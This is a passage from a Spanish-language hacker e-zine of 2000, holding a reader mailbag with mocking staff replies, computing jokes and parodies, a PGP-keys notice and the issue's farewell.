fuente de conocimientos.

[ Nex: Pues a mi ma~ana me va a dar una resaca de muerte .... ]

Nos vemos, y sigan asi

½ .o0o. Nykkro+Damage .o0o. ╗

________________________________________________________________________
Get Your Private, Free E-mail from MSN Hotmail at http://www.xxxxxx.com.

[ Nex: Notese que he tapado la url ... ]

Share information about yourself, create your own public profile at 
http://profiles.msn.com.

[ Nex: Uffff, que stressssss ... ]
[ Tkr: Si todos los passwd que tienes, son igual de facil de crackear como el
  que utilizaron  para  ENVIAR  correos  a  tu  nombre, cuidate que crear los 
  perfiles alli... XDD ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	hackram@xxxxxxxxx.net
Subject:        	cdlr
Date sent:      	Sat, 15 Jul 2000 20:15:50 -0500

       HoLa  eN PRiMeR LuGaR FeLiSiTaRLoS.

mas alla les ban unos articulo.

 [ Nex: Es que no publicamos cualquier cosa ... ]
 [ Tkr: Vueno, y con esa hortografia menos.... XDDD ]
 
En segundo lugar quero preguntarles como  puedo entrar a su grupo  o staff (o
como se escriba ).

 [Tkr: Entrar  al  staff  es  facilisimo,  solo tienes que demostrar, que has
  logrado  entrar  a la red de Microsoft y  conseguir  el  codigo  fuente  de
  cualquiera de sus plataformas... Y no digas que ya nadie lo ha hecho.]

Tambien aprobecho de pedirles que me espliquen ese proyecto  que tienen el de
un  servidor  una cosa  asi creo  que se llama  RC5 - Bovine. No se  mucho de
hacking pero me empe~o en saver y espero que me acepten. (conste c que no uso
linux  pero  estoi  instalandolo)  (lo  que  pasa que  no  cacho como  mierda
particiono el disco sin perder la informacion que tenia en windows) (igual un
poco de flogera mio :-(        perdon    )

 [Tkr: Haz oido hablar de la copias de seguridad..???]

antes de comensar con los articulos les pido por  fa que no den mi  e-mail ni
nada de lo de que me quero inscribir en su staff.(por razon X).

 [Tkr: Ok... ;)]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Mon, 25 Sep 2000 14:27:49 -0400 (EDT)
From:           	NDR 113 &lt;ndr113@xxxxxxx.com>
Subject:        	Saludos desde FYE

Saludos, que  les habia  pasado?  se les vio  desaperecidos durante  bastante

 [Tkr: Bueno,  esa  pregunta  es  facil  de  responder, trabajo, algo de vida 
  personal  "POR FIN", estudio, algo mas de vida personal, Alcohol..., en si,
  puras cosas sencillas. XDDD, ahhh, y tambien que andabamos sin servidor]

tiempo  a CDLR  y su web.  Escribo para  informar que  la web  de FYE  se  ha
actualizado, y cambiado de URL hacia www.350cc.com . En este web  como podran
ver si lo vivistan hemos tratado de  expandernos mas  alla de solo la  ezine,
para contruir poco a poco una web de seguridad informatica.

 [Tkr: Bueno, ya la he visto, sigan adelante.]
...
From:           	"Daniel Jacobino" &lt;volrath_site@xxxxxxxx.com>
Subject:        	desesperado
Date sent:      	Thu, 28 Sep 2000 21:03:57 -0200

holas soy un hacker ,pero muy basico y quiero pedirles algo:

He estado en la computacion desde los nueve a~os y nunca nadie me ha ense~ado
nada ,pero de a poco he ido aprendiendo y he logrado llegar a  acercarme cada
vez mas a lo que siempre me ha fascinado :el hacking , este tema me fascina y
siempre estoy leyendo manuales y cosas asi para ver si logro  acercarme a ser
un hacker  de verdad, pero  al no tener  nadie  que me ense~e se me  hace muy
dificil y de veras que  quiero ser un hacker. Yo se que lo mas seguro  es que
ustedes me digan no a lo que les quiero pedir por que hace mucho tiempo estoy
buscando  un hacker  que me  ense~e , pero siempre  me dicen "no". Ustedes no
saben lo agradecido  que estaria si ustedes  me ense~aran  hacking , pues por
ahora pertenezco  a un grupo, pero la  mayoria aun estan  aprendiendo en todo
caso esta es la pag: http://go.to/zonah

 [Tkr: Wait, wait, podrias definirme eso de hacker basico..???, porque  segun
  entiendo, los hackers, o son hackers, o no son hackers, esta es  una de las
  cosas que no me gusta... por ejemplo, no  se  puede  decir  medio  instale, 
  linux.. pues, o lo instalaste y funciona, o no lo terminaste, y no 
  funciona, por lo tanto, no lo instalaste.
  Ahora, este rollo de que llevas desde  los  9  a~os en la computacion, y lo
  que has  aprendido,  lo  haz  aprendido  solo,  pues,  felicitaciones... Yo
  tambien  hubiera  querido que mi PAPI me comprara un pc cuando tenia 9 a~os
  pero lo unico que consegui a esa edad, fue ********* ** ** ** y ya... so..
  y por ultimo, si llevas ya algunos a~os aprendiendo solo, por que ahora
  quieres que alguien se meta en tu vida a decirte como hacer las cosas..???]

bueno ojala que  alguien  de ustedes se  apiade de mi y  me ense~e  lo que me
ha fascinado desde hace tanto tiempo. de antemano muchas gracias bye

 [Tkr: Alguien se atreve..???]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	rodrigo_gonzalez@xxxxxx.cl
Subject:        	pregunta sobre "proyecto_r.reg"
Date sent:      	Mon, 2 Oct 2000 10:20:36 -0500

resulta que  yo hace algun  tiempo baje todos los textos del proyecto r desde
el pr1,  hasta el  pr8 con  la intencion  de  aprender  mas  sobre  seguridad
informatica. en el cual venia  incluido un archivo con  entradas de registro,
llamado "proyecto_r.reg" yo lo ejecute, se  agrego exitosamente el  registro,
pero una vez que reinicie el pc, no andubo mas, no me reconoce el disco duro,
por lo tanto no encuentra el sistema operativo, la BIOS a veces lo reconoce y
veces no. No encuentro forma para leer el HD,  no puedo ejecutar el scandisk,
ni el fdisk, ni chkdsk, nada, con nada puedo leerlo., ┐┐┐QUE HAGO??? necesito
recuperar  los  datos  del disco,  como lo  puedo hacer  agradeceria  que  me
ayudaran a  recuperar los  datos, no  me importa tener que formatearlo , pero
antes quiero los datos, que tengo en el!!!!!!!!!!!!!!

 [Tkr: Si, efectivamente eso era un virus, de hecho, cuando yo lo ejecute, mi
  mi abuela  fallecio,  mis  padres se separaron, me quede sin trabajo, hasta
  ahora "un a~o despues, no he  podido volver a utilizar mi pc, las teclas se
  traban, cuando de casualidad enciende,  no  hace  lo que yo quisiera, estoy
  desesperado, fui a consultar un brujo indio, y me  dijo que ese problema no
  tenia solucion... ya despues de tanto tiempo, me estoy  haciendo a la idea,
  y he decidido no confiar en nadie, y mucho menos en archivos con  extension
  "reg", y para sentar un precedente, deberias quejarte ante la asociacion de
  consumidores de tu pais... ahi te va la direccion..
  www.go-to-hell.org, ahh, y reclama de mi parte tambien.]

agradeceria me pudieran responder a mi correo

rodrigo_gonzalez@xxxxxx.cl
y con copia a 
zar@xxxxx.cl
8995356@xxxxxxx.cl
...
From:           	"theKondon theKondon" &lt;the_kondon@xxxxxxx.com>
Subject:        	Proyecto R
Date sent:      	Wed, 04 Oct 2000 02:38:36 GMT

Que paso con proyecto R alguien podria responderme ┤por favor

 [Tkr: Que paso de que..???
  han pasado muchas cosas, podrias ser mas explicito..???]

The Kondon

  [Nex: Tu handle me resulta familiar, ... ┐alguna noche salvaje, tal vez? ]

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"Dj in Work & Skater" &lt;x-files@xxxxxxx.cl>
To:             	&lt;proyecto_r@bigfoot.com>
Subject:        	hola
Date sent:      	Tue, 10 Oct 2000 00:19:46 -0300

QUIERO SABER QUE ES UN HACKER Y COMO PUEDO LLEGAR A SERLO

 [Tkr:  No  quiero definir que es un hacker, pues como todos hemos visto, esa
  palabra tiene una connotacion filosofica grandisima, y cada vez que alguien
  la define, o  intenta  definirla,  hay  gente  que  se  siente herida en su
  interior, este estado (el sentirse herido), crea una reaccion  negativa  en
  su  persona, esta reaccion negativa puede desencadenar en violencia, y como
  no me gusta la violencia, mejor "NO DIGO NADA".
  Con respecto a la otra pregunta, pues sencillo, mucho estudio.]
...
Date sent:      	Tue, 17 Oct 2000 06:05:01 -400
From:           	JOSE ALEJANDRO HUAIQUIN RICARDI &lt;jhuaiqui@xxxxxxx.cl>
Subject:        	SOLO CONSULTAS...

NO SOY HACKER NI MUCHO MENOS UN LAMER,PERO ME INTERESA MUCHO SUS PROYECTOS EN
LA  RED, Y  TENGO  MUCHAS  DUDAS  DESPUES  DE LO QUE DIJO  PLAXIUS EN INFORME
ESPECIAL:

1-ESTAN A FAVOR DE QUE COBREN POR EL DERECHO A TENER UN DOMINIO .COM O .CL ?

 [Tkr: Segun mi opinion personal, si, si estoy de acuerdo en el cobro, eso si
  Las tarifas deberian ser un poco mas bajas...]

2- EXISTE ALGUNA FORMA  DE NO TENER QUE PAGAR, SIN SER UN EXPERTO COMO UDS. Y
TENER UNA PAGINA PROPIA NO COMERCIAL,SIN PROPAGANDAS,NI NOMBRES MUY EXTENSOS?

 [Tkr: Algun  experto  por  aqui..???,  si  tu tienes una casa, y hay alguien
  Interesado en ella, le cobrarias para que se  mudaran  alli..???  yo  si lo
  haria, aunque fuera una minima parte si lo haria. creo que eso responde  la
  pregunta... Y me pone en contra de muchos. I don't care.!!!]

3-Y POR ULTIMO CUANDO VAN A ALZAR SU PAGINA DE WINDOWS NT ?

 [Tkr: Pronto.... o como dicen en cine... Coming Soon...]

ESO ES TODO GRACIAS.

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Tue, 17 Oct 2000 18:38:27 -0700 (PDT)
From:           	"Mr. kl0nk Manson" &lt;kl0nk@xxxxxx.com>
Subject:        	Ezine 1 de 0ri0n Team Venezuela

Saludos.

Quiero informarle que  0ri0n Team Venezuela  ha liberado su  primer  E-Zine y
pueden bajarlo de http://pleyades.sourceforge.net/go.php?ezine/0ri0n-1.zip

 [Tkr: Ok, muchas gracias]

P.D:  Si ustedes  deciden ser  mirror por favor colocarle al URL de bajada la
siguiente linea antes de su url: http://pleyades.sourceforge.net/go.php?

 [Tkr: Ok, gracias]

Por Ejemplo:
http://pleyades.sourceforge.net/go.php?http://www.talmirror.com/0ri0n/0ri0n-1.zip
   (esto es para poder llevar la estadistica de cuantas veces lo han bajado y
    de que mirror proviene).

 [Tkr: Ok.]
 [Nex: Un numero 1 potente, no os canseis. ]
...
http://www.0ri0n.org
e-Mail: kl0nk@xxxxx.org - kl0nk@xxxxxx.com
Linux Mandrake 7.1 - Kernel 2.2.16
----------------------------------------------------------------
Dime con Q┤sistema Operativos trabajas y te dire quien eres..:)
----------------------------------------------------------------

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

Date sent:      	Thu, 19 Oct 2000 08:39:42 -0400 (EDT)
From:           	falla de sistema anti estado &lt;f_d_s@xxxxxx.com>
Subject:        	salute!

uf, af, clif y claf... una pregunta (sobre lo "criminal")
Ustedes  creen que es criminal  vulnerar un sistema que se dedica a controlar
la vida economica y no economica de cada ser idotizado por el estado?

 [Tkr: Todo depende, depende, de lo que vayas a hacer al vulnerar el sistema]
  
Aquella entrevista, la escuche a lo lejos, no puedo opinar sobre ella.

 [Tkr: Yo  no  la escuche, asi que tampoco puedo opinar sobre ella, aunque si
  me regalas una copia, ya sea un mpeg o algo, me gustaria verla, imagina que
  sera la que le hicieron a plaxius... o no..??]

┐que mas criminal que el estado? ┐que mas criminal que matar de hambre?

 [Tkr: Que mas criminal que regalar 40.000 Kilometros  para  que  la guerrila
  haga de  las  suyas,  que  mas  criminal  que  aumentar los  impuestos para
  remediar los errores del gobierno... en fin, tienes razon.]

Entiendo  vuestra postura,  aunque no la respeto y no respetarla no significa
que los odie, sino... que no me admira.

 [Tkr: Que no me admira, o que no nos admiras...??] 

Salute!

Somos los hermanos de la luz y los hijos de la oscuridad...

 [Tkr: Y que las llamas nos cocinen en el infierno...!!!]

kaxfak.

-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

From:           	"richard_matheus"@xxxxx.com
Date sent:      	Thu, 26 Oct 2000 14:59:50 -0400
Subject:        	Consulta...

Buenas Tardes,

   Me dirijo a Uds.,  en la oportunidad de  consultarles que debo  hacer para
convertirme en hackers, hace algunos dias  me entere de algunas  cosas de las
que son capaces de hacer, y queria saber si existia la  posibilidad de que me
conviertieran  en su  alumno... o  por lo menos  que debo leer, cual es  fin,
sugerencias que de alguna forma me puedan  permitir aprender un  poco o mucho
de Uds., si de alguna manera pudieran brindarme su apoyo en la solicitud, se
los agradeceria y hasta podrian contar con una nueva mano amiga.

Sin mas a que hacer referencia y esperando su pronta respuesta, quedo de Uds.

 [Tkr: Lo siento, hace unos a~os prometi no volver a convertir a nadie, pues
  La  ultima  vez  que  lo  intente,  no resulto como yo esperaba, desde eso,
  decidi dejar la varita magica en mi casa, encerrada bajo llave...
  Y tengo SAPOS que me odian.]
...
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
              ...
              ..--:: 13. Chistes, Cuentos y otras burradas ::--..
                                  by Varios

 	       -->> Seccion posible gracias a marqueze.net <<--

Parejas Informaticas
--------------------

┐En cual de estas clasificaciones esta su pareja?
...
- Pareja Hardware:  A la que se  le busca  por su  dise~o exterior...  por su 
  aspecto puramente fisico.
- Pareja Software: A la que solo se acude para que le resuelva sus problemas.
- Pareja GetRight: Se pasa el dia bajandose todo.
- Pareja raton: La arrastrada.
- Pareja escaner: Se pega pasadas con todos.
- Pareja Motherboard: La clasica mama controladora.
- Pareja Palmtop: Chiquita pero eficiente.
- Pareja Monitor: Solo quiere que la vean a ella.
- Pareja Soundblaster: Tiene una voz bonita.
- Pareja USB: Gusta de conectarse con cualquier "dispositivo".
- Pareja Backspace: La que desearia volver con uno.
- Pareja Microsoft:  Siempre  nos  recibe  con un  espectacular ┐ Hasta donde 
  quieres llegar hoy?".
- Pareja Office: Un solo "paquete"  para varias  aplicaciones ...  ┐ Para que 
  quiere mas?
- Pareja Antivirus: Le quita la gripe con calentura.
- Pareja Univac: Muy grande, muy lenta y se calienta muy rapido.
- Pareja DOS: Todos la usaron algun dia, pero ya nadie la quiere.
- Pareja Historial: Se la pasa  recordandole a  uno todas  con las  que se ha 
  metido.
- Pareja Clonica: Buena, bonita y barata.
- Pareja DVD: Se ve de pelicula.
- Pareja Backup: La que siempre hay que tener en caso de emergencia.
- Pareja PhotoShop: La que mejor pinta, pero la que mas vale.
- Pareja Corel: Cuando se desmaquilla no es tan guapa, pero es tan buena...
- Pareja Multimedia: Le gusta por todos los..... medios.
- Pareja Encarta: Sabe un monton de tonterias.
- Pareja Windows98: Aquella que se pasa todo el dia colgada.
- Pareja Windows 95: Ha pasado por el 80 por ciento de los hogares del mundo.
...
# at now +1 hour unzip ; strip ; touch ; finger ; mount ; fsck ; more ; yes ;
  umount &lt;Ctrl-D> # sleep

Metodo en SVR4:
# unzip ; strip ; touch ; finger ; mount ; fsck ; more ; yes ; umount; wait 
# iostat; test; more; clean; expand; touch; man intro; putdev; fold; pack; 

<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<-<->->->->->->->->->->->->->->->->->->->

Sintomas de que su hijo se esta convirtiendo en un hacker
---------------------------------------------------------

1.- Para llamar la atencion, en la fiesta de noche vieja, conto algunos 
    secretitos del Pentagono.
2.- Sabia el final de Medico de Familia con dos meses de anticipacion.
3.- La ultima vez que se peleo con el padre, amenazo con bajarle el sueldo en 
    la empresa.
4.- Cuando alguno esta por viajar, el mocoso enseguida salta y pregunta: 
    "┐Fumador o no fumador?".
5.- Cuando su padre comenta en voz alta: "Se desmantelo el proyecto 'AGUILA'"
    el dice en voz baja "POR AHORA".
6.- Habla horas por telefono con una novia que se llama Internet.
7.- Por mas que usted se esfuerce, no logra poner en rojo las tarjetas de 
    credito de su marido.
8.- Cualquier profesor que se mete con su hijo, termina con la casa 
    bombardeada por el sistema de defensa espacial de EE.UU..
9.- En lugar del boletin, el nene presenta todos los meses el estado de 
...
- En el principio Dios creo el Bit y el Byte. Y de ellos creo la Palabra.

- Y habia 2 Bytes en la Palabra; y nada mas existia. Y Dios separo el Uno del 
  Cero: y vio que era bueno.

- Y Dios dijo: que se hagan los Datos; y asi paso . Y Dios dijo:  dejemos los
  Datos en sus correspondientes sitios.  Y creo  los  diskettes,  los  discos 
  duros y los discos compactos.

- Y Dios dijo: que se hagan los ordenadores, asi  habra un lugar  donde poner 
  los diskettes, los discos duros y  los discos  compactos. Asi Dios creo los
  ordenadores, y les llamo hardware.

- Pero  aun  no  habia  software.  Pero  Dios creo los programas;  grandes  y 
  peque~os... Y les dijo: Id y multiplicaos y llenad toda la memoria.

- Y Dios  dijo:  creare  el  Programador;  y  el  Programador  creara  nuevos 
  programas y gobernara los ordenadores y los programas y los datos.

- Y Dios creo al Programador; y lo puso en  el Centro  de  Datos;  y  Dios le 
  ense~o  al  Programador  el  Directorio y  le dijo:  Puedes usar  todos los 
  volumenes y subdirectorios, pero NO USES Windows.

- Y Dios dijo: no es bueno que el programador  este solo.  Cogio una costilla
  del cuerpo del Programador y creo una criatura que miraria al  Programador;
  y admirara al Programador; y amara las cosas que  el Programador hiciese. Y
  Dios llamo a la criatura Usuario.

- Y el Programador y el Usuario fueron dejados  en el desnudo  DOS y  eso era 
  bueno.

- Pero Bill era mas listo que todas las otras  criaturas  de Dios.  Y Bill le
  dijo al  Usuario:  Te  dijo  Dios  realmente  que  no ejecutaras  todos los 
  programas?

- Y el Usuario respondio : Dios nos dijo que podiamos usar cualquier programa
  y cualquier volumen de datos, pero nos dijo que  no ejecutasemos  Windows o 
  moririamos.

- Y Bill le dijo al Usuario: Como puedes hablar de  algo que  incluso no  has
  probado? En el momento en que ejecutes  Windows seras  igual a Dios.  Seras 
  capaz de crear cualquier cosa que quieras con el simple toque del raton.

- Y el Usuario vio que los frutos del Windows eran  mas bonitos y  faciles de
  usar. Y el  Usuario vio  que todo  conocimiento era  inutil, ya que Windows 
  podia reemplazarlo.

- Asi el Usuario instalo Windows en su  ordenador; y le  dijo al  programador 
  que era bueno.

- Y el programador inmediatamente empezo  a  buscar  nuevos  controladores. Y 
  Dios le pregunto : Que buscas? Y el Programador respondio :  Estoy buscando
  nuevos controladores porque no puedo encontrarlos  en el DOS.  Y Dios dijo: 
  Quien  te  dijo  que  necesitabas  nuevos  controladores?  Acaso ejecutaste 
  Windows? Y el Programador dijo: fue Bill quien nos lo dijo...

- Y Dios le dijo  a Bill:  Por lo  que hiciste,  seras odiado  por  todas las 
  criaturas.  Y  el  Usuario  siempre estara  descontento contigo.  Y siempre 
  venderas Windows.

- Y Dios le dijo al Usuario: Por lo que hiciste, el Windows te decepcionara y
  se comera todos tus recursos; y tendras que usar malos programas; y siempre
  permaneceras bajo la ayuda del Programador.

- Y Dios  le dijo al Programador: Por haber escuchado  al Usuario nunca seras 
  feliz. Todos tus programas  tendran  errores  y tendras  que  corregirlos y 
  corregirlos hasta el final de los tiempos.

- Y Dios  los echo a todos del Centro de  Datos y bloqueo  la puerta  con una 
  clave de acceso.
...
La problematica del a~o 2.000
-----------------------------

Habia un programador de COBOL, llamado Jack, que vivia a finales de los 90.

Tras muchos a~os en los que todos los programadores de UNIX, programadores de
Cliente Servidor y  desarrolladores  de Web  le trataran  como un  dinosaurio 
tecnologico, Jack estaba consiguiendo por fin algo de respeto.

Se habia convertido en un consultor privado especializado en conversiones del
a~o  2000.  Habia  trabajado  en   tareas  a   corto  plazo   para  compa~ias 
prestigiosas,  viajando  por  todo  el  mundo realizando distintos proyectos. 
Trabajaba 70 80 y hasta 90 horas semanales.

Pero varios a~os de este trabajo  apresurado  y agotador  estaba  cobrando su 
deuda a Jack. Tenia problemas para dormir y empezo a tener sue~os angustiosos
respecto al a~o 2000. Habia llegado a un punto en el que incluso pensar en el
a~o 2000 le ponia casi violento.

Sufrio una crisis porque solo podia pensar en la manera de evitar el a~o 2000.
Jack decidio ponerse en contacto con una compa~ia especializada en criogenia. 
Hizo un trato para congelarse hasta el 15 de  Marzo del 2000.  Era un proceso 
muy caro  y totalmente  automatizado.  Estaba muy excitado.  Lo siguiente que 
sabria es  que se habria  despertado en el 2000 despues de las fiestas de A~o 
Nuevo y de los  problemas  informaticos  despues del  dia del gran  salto. No 
habria nada mas de lo que preocuparse excepto de seguir con su vida.

Fue introducido en su camara criogenica los tecnicos ajustaron la fecha en la
que  despertaria le  administraron  inyecciones para  ralentizar su  pulso al 
minimo y ya esta.

Lo siguiente que vio Jack fue una enorme y moderna habitacion  llena de gente
excitadisima.  Todos gritaban:  íNo me lo puedo crees!  íEs un milagro! íEsta 
vivo!. Habia  camaras que no  se parecian a ninguna que hubiese visto antes y
equipamiento que parecia sacado  de una pelicula  de ciencia ficcion. Alguien
que obviamente era un portavoz del grupo se adelanto.

Jack no podia contener su entusiasmo  ┐Ya esta  pregunto?  ┐Ya ha  llegado el 
2000? ┐Se han terminado todas las fiestas  de cambio de  milenio y  todas las 
crisis?.  El  portavoz  le  explico  que  habia  habido  un  problema  con la 
programacion del temporizador de la camara criogenica de Jack y no habia sido
preparada para el a~o 2000. En realidad habian pasado mas de 7.000 a~os, pero
el portavoz le dijo a Jack que  no debia  enfadarse.  Alguien  MUY importante 
queria hablar con el en ese mismo momento. De repente una pantalla del tama~o
de una pared mostro la imagen de un hombre que se parecia mucho a Bill Gates.
Era el Primer Ministro de la Tierra. Le dijo a Jack  que no se  enfadara, que 
esta era una epoca magnifica para vivir. Habia paz mundial y no habia hambre,
el programa espacial habia continuado y ya existian colonias en la  Luna y en 
Marte.

La tecnologia habia  avanzado  hasta  tal  punto  que  todo  el  mundo  tenia 
interfaces de  realidad virtual  que les  permitian  ponerse en  contacto con 
cualquier otra persona en el planeta o ver cualquier  espectaculo  o escuchar
musica grabada en cualquier lugar.

┐Eso  suena maravilloso!  dijo Jack,  pero  ┐Por que esta todo  el  mundo tan 
interesado en mi?

"Bueno, dijo el Primer Ministro, el a~o 10.000 esta a la vuelta de la esquina
y en tu curriculum pone que sabes COBOL............"
...
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
  ...
  Esta seccion no se para que diablos se pone, porque jamas hemos recibido ni
un solo  correo encriptado, ...  en fin, pero por si acaso le da a alguien la 
paranoia, tiene las llaves PGP de toda la gente del staff en:

                             www.cdlr.org/llaves/

  Que seccion mas corta ....
...
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-
  ...
  Por fin se acabo, ....  (y eso que estas  lineas las escribo cuando todavia
me  faltan dos  articulos xD).  Bueno,  el caso es que esta despedida  va con 
dedicatoria, quisiera dedicar este numero  de la R a todas  aquellas personas 
que algun dia se molestaron en pelear por el hack y la seguridad en redes.

  Esta R 10 va  dedicada  a mucha  gente,  Raretrip,  Raven Spirit,  Eljaker, 
Warezzman (a pesar de todo...),  Galahad,  Wendigo,  FastData, ...  y  muchos 
mas, seguro que se me olvida alguno, ...

Algunos de estos ya no estan, otros siguen como  el primer dia,  otros siguen
por ahi, pero con otros handles y otros proyectos, ... por todos ellos.

:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

  nexocase:~ # date
  Sat Oct  7 03:20:51 GMT+1 2000
  nexocase:~ # write teespy na, pos sacaremos el zine en un par de dias ...
